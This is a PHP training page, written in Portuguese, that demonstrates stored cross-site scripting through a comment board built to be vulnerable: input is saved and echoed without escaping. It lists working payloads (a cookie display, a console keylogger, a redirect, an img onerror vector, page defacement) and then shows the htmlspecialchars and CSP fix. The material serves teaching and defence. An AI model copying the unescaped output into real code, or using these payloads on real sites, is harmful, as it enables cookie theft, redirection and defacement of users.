<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>Demo XSS Armazenado – Formação</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 900px; margin: 40px auto; padding: 0 20px; background: #f5f5f5; }
        h1 { color: #8e44ad; }
        .box { background: white; padding: 20px; border-radius: 8px; margin: 20px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .aviso { background: #fff3cd; border-left: 4px solid #f39c12; padding: 10px 15px; margin-bottom: 20px; }
        textarea { width: 95%; padding: 8px; font-size: 14px; height: 80px; }
        input[type=text] { width: 70%; padding: 8px; font-size: 14px; }
        input[type=submit] { padding: 8px 16px; background: #8e44ad; color: white; border: none; cursor: pointer; font-size: 14px; border-radius: 4px; }
        .comentario { background: #ecf0f1; padding: 12px; border-radius: 6px; margin: 10px 0; border-left: 4px solid #8e44ad; }
        .comentario .autor { font-weight: bold; color: #2c3e50; font-size: 13px; }
        .comentario .data { color: #999; font-size: 11px; margin-left: 8px; }
        .danger { color: #c0392b; font-weight: bold; }
        code { background: #2c3e50; color: #2ecc71; padding: 10px; display: block; border-radius: 4px; margin: 8px 0; font-size: 13px; word-break: break-all; }
        h3 { color: #2980b9; }
        .badge { background: #c0392b; color: white; padding: 2px 8px; border-radius: 10px; font-size: 12px; }
        .vs { display: flex; gap: 20px; }
        .vs div { flex: 1; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        td, th { border: 1px solid #ddd; padding: 8px 12px; text-align: left; }
        th { background: #8e44ad; color: white; }
        tr:nth-child(even) { background: #f9f9f9; }
        .btn-limpar { background: #e74c3c; margin-left: 10px; }
    </style>
</head>
<body>

<h1>⚠️ Demo: XSS Armazenado <span class="badge">Stored XSS</span></h1>

<div class="aviso">
    <strong>Apenas para fins de formação.</strong>
    Este ficheiro demonstra uma vulnerabilidade real de Cross-Site Scripting (XSS) armazenado.
    Os payloads são guardados na base de dados e executados em <em>todos</em> os browsers que visitarem a página.
    Não utilizar em ambiente de produção.
</div>

<?php
// ─── Ligação à base de dados ───────────────────────────────────
$host = getenv('DB_HOST') ?: 'mysql';
$db   = getenv('DB_DATABASE') ?: 'appdb';
$user = getenv('DB_USERNAME') ?: 'appuser';
$pass = getenv('DB_PASSWORD') ?: 'secret';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("<div class='box' style='color:red'>❌ Erro de ligação à base de dados: " . $e->getMessage() . "</div>");
}

// ─── Criar tabela se não existir ──────────────────────────────
$pdo->exec("
    CREATE TABLE IF NOT EXISTS comentarios (
        id INT AUTO_INCREMENT PRIMARY KEY,
        autor VARCHAR(100),
        mensagem TEXT,
        criado_em DATETIME DEFAULT CURRENT_TIMESTAMP
    )
");

// ─── Limpar todos os comentários ──────────────────────────────
if (isset($_POST['limpar'])) {
    $pdo->exec("DELETE FROM comentarios");
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ─── Guardar comentário (❌ SEM sanitização — vulnerável) ──────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['autor'])) {
    // ❌ VULNERÁVEL: dados inseridos diretamente sem htmlspecialchars()
    $autor    = $_POST['autor'];
    $mensagem = $_POST['mensagem'];

    // Nota: usa prepared statements (evita SQL injection)
    // mas NÃO sanitiza o output HTML — XSS persiste na leitura
    $stmt = $pdo->prepare("INSERT INTO comentarios (autor, mensagem) VALUES (?, ?)");
    $stmt->execute([$autor, $mensagem]);

    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// ─── Ler comentários da base de dados ─────────────────────────
$comentarios = $pdo->query("SELECT * FROM comentarios ORDER BY criado_em DESC")->fetchAll(PDO::FETCH_ASSOC);
?>

<!-- ============================================================
     FORMULÁRIO DE COMENTÁRIOS
     ============================================================ -->
<div class="box">
    <h2>💬 Mural de Comentários</h2>
    <form method="POST" action="">
        <p>
            <label>Nome:</label><br>
            <input type="text" name="autor" placeholder="O teu nome..." required>
        </p>
        <p>
            <label>Comentário:</label><br>
            <textarea name="mensagem" placeholder="Escreve aqui o teu comentário..." required></textarea>
        </p>
        <input type="submit" value="Publicar Comentário">
        <input type="submit" name="limpar" value="🗑 Limpar tudo" class="btn-limpar"
               onclick="return confirm('Apagar todos os comentários?')">
    </form>
</div>

<!-- ============================================================
     LISTAGEM DE COMENTÁRIOS
     ============================================================ -->
<div class="box">
    <h2>📋 Comentários publicados (<?= count($comentarios) ?>)</h2>

    <?php if (empty($comentarios)): ?>
        <p style="color:#999">Ainda não há comentários.</p>
    <?php endif; ?>

    <?php foreach ($comentarios as $c): ?>
        <div class="comentario">
            <span class="autor"><?= $c['autor'] ?></span>
            <span class="data"><?= $c['criado_em'] ?></span>
            <!-- ❌ VULNERÁVEL: mensagem refletida sem sanitização -->
            <p><?= $c['mensagem'] ?></p>
        </div>
    <?php endforeach; ?>
</div>

<!-- ============================================================
     SECÇÃO EDUCATIVA
     ============================================================ -->
<div class="box">
    <h3>🎓 Como explorar esta vulnerabilidade</h3>
    <p>Submete os seguintes payloads no campo <strong>Comentário</strong>. O código fica guardado na base de dados e executa em <span class="danger">todos os browsers</span> que visitarem a página.</p>

    <p><strong>1. Alerta básico:</strong></p>
    <code>&lt;script&gt;alert('XSS Armazenado!')&lt;/script&gt;</code>

    <p><strong>2. Roubo de cookies (simulação):</strong></p>
    <code>&lt;script&gt;alert('Cookie: ' + document.cookie)&lt;/script&gt;</code>

    <p><strong>3. Keylogger no browser da vítima:</strong></p>
    <code>&lt;script&gt;document.onkeypress=function(e){console.log('Tecla: '+e.key)}&lt;/script&gt;</code>

    <p><strong>4. Redirecionamento silencioso:</strong></p>
    <code>&lt;script&gt;window.location='https://example.com'&lt;/script&gt;</code>

    <p><strong>5. Via atributo (sem tag script):</strong></p>
    <code>&lt;img src=x onerror="alert('XSS via img')"&gt;</code>

    <p><strong>6. Defacement da página:</strong></p>
    <code>&lt;script&gt;document.body.innerHTML='&lt;h1&gt;Hacked!&lt;/h1&gt;'&lt;/script&gt;</code>
</div>

<div class="box">
    <h3>🔄 XSS Refletido vs XSS Armazenado</h3>
    <table>
        <tr>
            <th></th>
            <th>Refletido</th>
            <th>Armazenado</th>
        </tr>
        <tr>
            <td><strong>Onde fica o payload</strong></td>
            <td>Na URL / request</td>
            <td>Na base de dados</td>
        </tr>
        <tr>
            <td><strong>Quem é afetado</strong></td>
            <td>Quem clica no link malicioso</td>
            <td>Todos os visitantes da página</td>
        </tr>
        <tr>
            <td><strong>Persistência</strong></td>
            <td>Não persiste</td>
            <td>Persiste até ser removido</td>
        </tr>
        <tr>
            <td><strong>Gravidade</strong></td>
            <td>Alta</td>
            <td><span class="danger">Crítica</span></td>
        </tr>
        <tr>
            <td><strong>Vetor típico</strong></td>
            <td>Phishing por email/link</td>
            <td>Formulários públicos (comentários, perfis)</td>
        </tr>
    </table>
</div>

<div class="box">
    <h3>🛡️ Como corrigir</h3>
    <p>Sanitizar o output com <strong>htmlspecialchars()</strong> antes de escrever no HTML:</p>
    <code>
// ❌ Vulnerável<br>
&lt;?= $c['mensagem'] ?&gt;<br><br>
// ✅ Corrigido<br>
&lt;?= htmlspecialchars($c['mensagem'], ENT_QUOTES, 'UTF-8') ?&gt;
    </code>
    <p>Adicionalmente, usar uma <strong>Content Security Policy (CSP)</strong> no header HTTP:</p>
    <code>Content-Security-Policy: default-src 'self'; script-src 'self'</code>
</div>

</body>
</html>
